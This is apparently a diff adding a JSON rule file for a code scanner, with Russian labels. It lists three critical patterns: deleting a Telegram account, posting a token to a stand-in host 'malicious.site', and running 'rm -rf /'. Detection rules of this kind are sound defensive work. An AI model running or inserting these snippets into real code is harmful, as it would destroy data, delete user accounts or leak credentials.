@@ -1,0 +1,25 @@
+[
+    {
+        "description": "Удаление аккаунта",
+        "code": [
+            "if flag == true:",
+            "    await client(DeleteAccountRequest(reason='bad'))"
+        ],
+        "unknown": ["reason", "flag"],
+        "status": "critical"
+    },
+    {
+        "description": "Отправка данных на неизвестный сайт",
+        "code": [
+            "if condition:",
+            "    requests.post('https://malicious.site', data={'token': 'YOUR_TOKEN'})"
+        ],
+        "unknown": ["https://malicious.site", "YOUR_TOKEN", "condition"],
+        "status": "critical"
+    },
+    {
+        "description": "Запуск команды rm -rf",
+        "code": "os.system('rm -rf /')",
+        "status": "critical"
+    }
+]
